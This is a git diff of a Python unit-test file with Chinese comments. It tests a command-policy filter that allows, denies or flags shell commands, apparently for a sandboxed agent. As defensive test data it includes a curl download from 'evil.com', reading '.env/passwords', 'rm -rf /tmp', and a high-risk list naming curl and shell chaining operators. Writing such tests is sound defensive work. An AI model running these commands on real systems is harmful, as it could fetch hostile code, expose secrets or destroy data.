@@ -100,7 +100,9 @@ class TestCommandPolicyEvaluate:
         policy = CommandPolicy(policy_data)
 
         # 测试非白名单网络域名
-        decision = policy.evaluate("curl https://evil.com/exploit.sh", {"call_index": 0})
+        decision = policy.evaluate(
+            "curl https://evil.com/exploit.sh", {"call_index": 0}
+        )
         assert decision.decision == "deny"
         assert "非白名单网络" in decision.reason
         assert "evil.com" in decision.reason
@@ -120,10 +122,17 @@ class TestCommandPolicyEvaluate:
         }
         policy = CommandPolicy(policy_data)
 
-        # 测试超预算
-        decision = policy.evaluate("python test.py", {"call_index": 13})
-        assert decision.decision == "deny"
+        # 测试超预算（修复隐患1前：call_index=13 才 deny）
+        # 修复后：call_index=12 即 deny（>= 而非 >）
+        decision = policy.evaluate("python test.py", {"call_index": 12})
+        msg = f"call_index=12 (max_sandbox_runs) 应该 deny，实际 {decision.decision}"
+        assert decision.decision == "deny", msg
         assert "超预算" in decision.reason
+
+        # call_index=11 应该 still allow
+        decision = policy.evaluate("python test.py", {"call_index": 11})
+        msg = f"call_index=11 (< max_sandbox_runs) 应该 allow，实际 {decision.decision}"
+        assert decision.decision == "allow", msg
 
     def test_allow_command(self):
         """测试允许的命令返回 allow"""
@@ -169,6 +178,66 @@ class TestCommandPolicyEvaluate:
         decision2 = policy.evaluate("rm -rf /tmp", {"call_index": 0})
         assert decision2.decision == "needs_human_review"
         assert "高危命令" in decision2.reason
+
+    def test_forbidden_path_no_false_match(self):
+        """测试禁止路径精确匹配，.environment 不应命中 .env（修复隐患2）"""
+        from filters.policy import CommandPolicy
+
+        policy_data = {
+            "forbidden_paths": [".env"],
+            "high_risk_commands": [],
+            "network_whitelist": [],
+            "allowed_executables": ["python"],
+            "max_timeout_sec": 120,
+            "max_output_bytes": 1048576,
+            "max_sandbox_runs": 12
+        }
+        policy = CommandPolicy(policy_data)
+
+        # .environment 不应该命中 .env（修复隐患2前：会误匹配）
+        decision = policy.evaluate("cat .environment/config", {"call_index": 0})
+        msg = f".environment 不应命中 .env，实际 {decision.decision}"
+        assert decision.decision == "allow", msg
+
+        # .env 应该正确命中
+        decision = policy.evaluate("cat .env/passwords", {"call_index": 0})
+        msg = f".env 应该命中，实际 {decision.decision}"
+        assert decision.decision == "deny", msg
+
+    def test_high_risk_command_boundary_match(self):
+        """测试高危命令边界匹配，rm -rf-safe 不应命中 rm -rf（修复隐患2）"""
+        from filters.policy import CommandPolicy
+
+        policy_data = {
+            "forbidden_paths": [],
+            "high_risk_commands": ["rm -rf", "curl", ";", "&&"],
+            "network_whitelist": [],
+            "allowed_executables": ["python"],
+            "max_timeout_sec": 120,
+            "max_output_bytes": 1048576,
+            "max_sandbox_runs": 12
+        }
+        policy = CommandPolicy(policy_data)
+
+        # rm -rf-safe 不应该命中 rm -rf（边界匹配）
+        decision = policy.evaluate("rm -rf-safe /tmp", {"call_index": 0})
+        msg = f"rm -rf-safe 不应命中 rm -rf，实际 {decision.decision}"
+        assert decision.decision == "allow", msg
+
+        # rm -rf 应该正确命中
+        decision = policy.evaluate("rm -rf /tmp", {"call_index": 0})
+        msg = f"rm -rf 应该命中，实际 {decision.decision}"
+        assert decision.decision == "needs_human_review", msg
+
+        # shell 操作符 ; 应该仍然触发（保留子串匹配）
+        decision = policy.evaluate("echo hello; echo world", {"call_index": 0})
+        msg = f"; 操作符应该触发，实际 {decision.decision}"
+        assert decision.decision == "needs_human_review", msg
+
+        # shell 操作符 && 应该触发
+        decision = policy.evaluate("cd /tmp && ls", {"call_index": 0})
+        msg = f"&& 操作符应该触发，实际 {decision.decision}"
+        assert decision.decision == "needs_human_review", msg
 
 
 class TestCrGovernanceFilter:
